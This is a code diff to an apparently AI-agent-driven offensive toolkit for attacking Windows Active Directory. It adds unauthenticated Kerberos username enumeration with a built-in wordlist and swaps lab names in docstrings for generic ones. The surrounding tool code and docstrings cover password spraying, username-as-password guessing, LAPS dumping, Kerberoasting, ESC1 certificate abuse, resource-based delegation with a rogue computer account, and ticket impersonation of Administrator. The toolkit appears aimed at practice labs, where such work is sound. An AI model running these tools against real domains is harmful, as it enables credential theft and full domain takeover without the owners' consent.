@@ -9,6 +9,7 @@ All tools execute commands remotely on the Kali attack box via AWS SSM.
 import json
 import logging
 import re
+import tempfile
 import time
 from datetime import datetime, timezone
 from typing import Any
@@ -229,12 +230,25 @@ class NetworkEnumerationTools(Toolset):
                 f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
             )
 
-            if not (username and password) and not _has_user_entries(output):
+            if not (username and password):
                 rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
                 rpc_stdout, rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
                 if rpc_stdout or rpc_stderr:
                     logger.info(f"[*] Null session user enumeration fallback used for {target}")
-                    return rpc_stdout or rpc_stderr
+                    rpc_output = rpc_stdout or rpc_stderr
+                    if _has_user_entries(rpc_output):
+                        return rpc_output
+
+                domain_hint = domain
+                if not domain_hint and self.state and self.state.target:
+                    domain_hint = self.state.target.domain or ""
+                if domain_hint:
+                    cred_tools = CredentialHarvestingTools()
+                    if self.state is not None:
+                        cred_tools.set_state(self.state)
+                    kerb_output = cred_tools.kerberos_user_enum_noauth(domain_hint, target)
+                    if kerb_output:
+                        return (output + "\n\n" + kerb_output) if output else kerb_output
 
             return output
 
@@ -481,11 +495,11 @@ class CredentialDiscoveryTools(Toolset):
         Many environments have passwords stored in the description attribute of user
         accounts. This is a common misconfiguration that provides immediate access.
 
-        **RUN THIS EARLY** - It's fast and often yields credentials like samwell.tarly:Heartsbane.
+        **RUN THIS EARLY** - It's fast and often yields credentials like dave.lee:ExamplePass123!.
 
         Args:
             target: Domain controller IP address
-            domain: Target domain (e.g., 'sevenkingdoms.local')
+            domain: Target domain (e.g., 'example.local')
             username: Username for LDAP authentication
             password: Password for authentication
 
@@ -493,7 +507,7 @@ class CredentialDiscoveryTools(Toolset):
             Users with non-empty descriptions (check for passwords!)
 
         Example:
-            >>> ldap_search_descriptions("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+            >>> ldap_search_descriptions("192.168.56.10", "example.local", "user", "pass")
         """
         # Convert domain to base DN
         base_dn = ",".join([f"DC={part}" for part in domain.split(".")])
@@ -527,7 +541,7 @@ class CredentialDiscoveryTools(Toolset):
                 logger.warning("[!] Found users with descriptions - CHECK FOR PASSWORDS!")
                 result = (
                     "🚨 USERS WITH DESCRIPTIONS FOUND - CHECK FOR PASSWORDS!\n"
-                    "→ Common pattern: user 'samwell.tarly' has password 'Heartsbane' in description\n"
+                    "→ Common pattern: user 'dave.lee' has password 'ExamplePass123!' in description\n"
                     "→ Test any found credentials immediately with domain_admin_checker\n\n"
                     + result
                 )
@@ -593,8 +607,8 @@ class CredentialDiscoveryTools(Toolset):
             Successful authentications (look for valid credentials)
 
         Example:
-            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1")  # auto-enumerate
-            >>> password_spray("192.168.56.10", "north.sevenkingdoms.local", "Password1", "/tmp/users.txt")
+            >>> password_spray("192.168.56.10", "child.example.local", "Password1")  # auto-enumerate
+            >>> password_spray("192.168.56.10", "child.example.local", "Password1", "/tmp/users.txt")
         """
         try:
             # Auto-enumerate users if no file provided
@@ -737,7 +751,7 @@ class CredentialDiscoveryTools(Toolset):
         """
         Test if any user has their username as their password (LOW HANGING FRUIT).
 
-        Many users set their password to match their username (e.g., hodor:hodor).
+        Many users set their password to match their username (e.g., user1:user1).
         This is fast, safe (one attempt per user), and often successful.
 
         **RUN THIS EARLY** - Zero lockout risk, high success rate in weak environments.
@@ -754,8 +768,8 @@ class CredentialDiscoveryTools(Toolset):
             Users with username=password combinations
 
         Example:
-            >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local")  # auto-enumerate
-            >>> username_as_password("192.168.56.10", "north.sevenkingdoms.local", "/tmp/users.txt")
+            >>> username_as_password("192.168.56.10", "child.example.local")  # auto-enumerate
+            >>> username_as_password("192.168.56.10", "child.example.local", "/tmp/users.txt")
         """
         try:
             # Auto-enumerate users if no file provided
@@ -791,7 +805,7 @@ class CredentialDiscoveryTools(Toolset):
                 logger.warning("[!] FOUND USER WITH USERNAME=PASSWORD!")
                 result = (
                     "🚨 USERNAME=PASSWORD FOUND!\n"
-                    "→ Common examples: hodor:hodor, guest:guest\n"
+                    "→ Common examples: user1:user1, guest:guest\n"
                     "→ Use found credentials for kerberoast, asrep_roast, bloodhound\n\n" + result
                 )
 
@@ -849,7 +863,7 @@ class CredentialDiscoveryTools(Toolset):
             Password policy details from the domain controller
 
         Example:
-            >>> password_policy("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+            >>> password_policy("192.168.56.10", "example.local", "user", "pass")
         """
         cmd = [
             "netexec",
@@ -953,7 +967,7 @@ class CredentialDiscoveryTools(Toolset):
             LAPS passwords for computers where you have read access
 
         Example:
-            >>> laps_dump("192.168.56.10", "sevenkingdoms.local", "user", "pass")
+            >>> laps_dump("192.168.56.10", "example.local", "user", "pass")
         """
         cmd = [
             "netexec",
@@ -1155,6 +1169,110 @@ class CredentialHarvestingTools(Toolset):
 
         except Exception as e:
             return f"Kerberoasting failed: {e!s}"
+
+    @dn.tool_method
+    def kerberos_user_enum_noauth(
+        self,
+        domain: str,
+        dc_ip: str,
+        users_file: str = "",
+    ) -> str:
+        """
+        Validate usernames via Kerberos without creds using GetNPUsers.py -no-pass.
+
+        This uses unauthenticated Kerberos pre-auth enumeration to confirm
+        valid principals even when SMB/LDAP enumeration is blocked.
+
+        Args:
+            domain: Target domain (e.g., 'example.local')
+            dc_ip: Domain controller IP address
+            users_file: Path to usernames file (optional)
+
+        Returns:
+            Raw tool output with a summary of validated principals (if any)
+        """
+        try:
+            if not users_file:
+                default_users = [
+                    "administrator",
+                    "guest",
+                    "krbtgt",
+                    "svc",
+                    "helpdesk",
+                    "backup",
+                    "sqlsvc",
+                    "carol",
+                    "carol.ng",
+                    "dave.lee",
+                    "frank.cho",
+                ]
+                with tempfile.NamedTemporaryFile(
+                    mode="w",
+                    encoding="utf-8",
+                    prefix="ares-userlist-",
+                    suffix=".txt",
+                    delete=False,
+                ) as handle:
+                    handle.write("\n".join(default_users) + "\n")
+                    users_file = handle.name
+
+            cmd = [
+                "impacket-GetNPUsers",
+                f"{domain}/",
+                "-usersfile",
+                users_file,
+                "-dc-ip",
+                dc_ip,
+                "-no-pass",
+            ]
+
+            logger.info(f"[*] Kerberos user enumeration (no-auth) against {domain} via {dc_ip}")
+            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
+            output = (stdout or "") + ("\n" + stderr if stderr else "")
+
+            validated: set[str] = set()
+            for line in output.splitlines():
+                if "User " not in line:
+                    continue
+                if any(
+                    marker in line
+                    for marker in (
+                        "UF_DONT_REQUIRE_PREAUTH",
+                        "KDC_ERR_CLIENT_REVOKED",
+                        "doesn't have UF_DONT_REQUIRE_PREAUTH set",
+                        "does not have UF_DONT_REQUIRE_PREAUTH set",
+                    )
+                ):
+                    match = re.search(r"User\s+([^\s]+)", line)
+                    if match:
+                        validated.add(match.group(1))
+
+            if validated and self.state:
+                existing = {user.username.lower() for user in self.state.users}
+                for username in sorted(validated):
+                    if username.lower() in existing:
+                        continue
+                    self.state.users.append(
+                        User(
+                            username=username,
+                            domain=domain,
+                            description="validated via Kerberos (no-auth)",
+                        )
+                    )
+                    logger.info(
+                        "[+] Recorded user from Kerberos no-auth: %s@%s",
+                        username,
+                        domain,
+                    )
+
+            if validated:
+                summary = ", ".join(sorted(validated))
+                return f"✓ Valid principals (Kerberos no-auth): {summary}\n\n{output}"
+
+            return output
+
+        except Exception as e:
+            return f"Kerberos user enumeration (no-auth) failed: {e!s}"
 
     @dn.tool_method
     def asrep_roast(
@@ -1806,7 +1924,7 @@ class BloodHoundTools(Toolset):
         CRITICAL: Run this with ANY valid credentials to find escalation paths.
 
         Args:
-            domain: Target domain (e.g., 'sevenkingdoms.local')
+            domain: Target domain (e.g., 'example.local')
             username: Valid domain username
             password: Password for authentication
             dc_ip: Domain controller IP address
@@ -1819,7 +1937,7 @@ class BloodHoundTools(Toolset):
             - recommended_actions: Specific next steps with tool parameters
 
         Example:
-            >>> run_bloodhound("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
+            >>> run_bloodhound("example.local", "dave.lee", "ExamplePass123!", "192.168.56.10")
         """
         cmd = [
             "bloodhound-python",
@@ -2094,7 +2212,7 @@ class CertipyTools(Toolset):
             - certificate_authorities: List of discovered CAs
 
         Example:
-            >>> certipy_find("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
+            >>> certipy_find("example.local", "dave.lee", "ExamplePass123!", "192.168.56.10")
             # If ESC1 found, output includes:
             # "recommended_actions": [{"action": "certipy_req_esc1", "parameters": {...}}]
         """
@@ -2190,14 +2308,14 @@ class CertipyTools(Toolset):
             password: Password for authentication
             ca_name: CA name from certipy_find
             template_name: Vulnerable template name
-            target_upn: Target UPN (e.g., 'administrator@sevenkingdoms.local')
+            target_upn: Target UPN (e.g., 'administrator@example.local')
             dc_ip: Domain controller IP
 
         Returns:
             Certificate PFX file path
 
         Example:
-            >>> certipy_req_esc1("sevenkingdoms.local", "user", "pass", "CA-NAME", "ESC1Template", "administrator@sevenkingdoms.local", "192.168.56.10")
+            >>> certipy_req_esc1("example.local", "user", "pass", "CA-NAME", "ESC1Template", "administrator@example.local", "192.168.56.10")
         """
         cmd = [
             "certipy",
@@ -2505,7 +2623,7 @@ class DelegationTools(Toolset):
             List of accounts with delegation
 
         Example:
-            >>> find_delegation("sevenkingdoms.local", "samwell.tarly", "Heartsbane", "192.168.56.10")
+            >>> find_delegation("example.local", "dave.lee", "ExamplePass123!", "192.168.56.10")
         """
         cmd = [
             "impacket-findDelegation",
@@ -2548,7 +2666,7 @@ class DelegationTools(Toolset):
             Status of computer account creation
 
         Example:
-            >>> add_computer("sevenkingdoms.local", "user", "pass", "EVILPC", "P@ss123!", "192.168.56.10")
+            >>> add_computer("example.local", "user", "pass", "EVILPC", "P@ss123!", "192.168.56.10")
         """
         cmd = [
             "impacket-addcomputer",
@@ -2596,7 +2714,7 @@ class DelegationTools(Toolset):
             Status of RBCD configuration
 
         Example:
-            >>> rbcd_write("sevenkingdoms.local", "user", "pass", "EVILPC$", "DC01$", "192.168.56.10")
+            >>> rbcd_write("example.local", "user", "pass", "EVILPC$", "DC01$", "192.168.56.10")
         """
         cmd = [
             "impacket-rbcd",
@@ -2638,7 +2756,7 @@ class DelegationTools(Toolset):
             domain: Target domain
             computer_name: Your controlled computer (with $)
             computer_password: Computer password
-            target_spn: Target SPN (e.g., 'cifs/dc01.sevenkingdoms.local')
+            target_spn: Target SPN (e.g., 'cifs/dc01.example.local')
             impersonate_user: User to impersonate ('Administrator')
             dc_ip: Domain controller IP
 
@@ -2646,7 +2764,7 @@ class DelegationTools(Toolset):
             Service ticket saved as .ccache - use with KRB5CCNAME
 
         Example:
-            >>> get_st("sevenkingdoms.local", "EVILPC$", "P@ss!", "cifs/dc01.sevenkingdoms.local", "Administrator", "192.168.56.10")
+            >>> get_st("example.local", "EVILPC$", "P@ss!", "cifs/dc01.example.local", "Administrator", "192.168.56.10")
         """
         cmd = [
             "impacket-getST",
@@ -3351,7 +3469,7 @@ class MSSQLTools(Toolset):
             Login result and database enumeration
 
         Example:
-            >>> mssql_login("192.168.56.22", "samwell.tarly", "Heartsbane", "north.sevenkingdoms.local")
+            >>> mssql_login("192.168.56.22", "dave.lee", "ExamplePass123!", "child.example.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
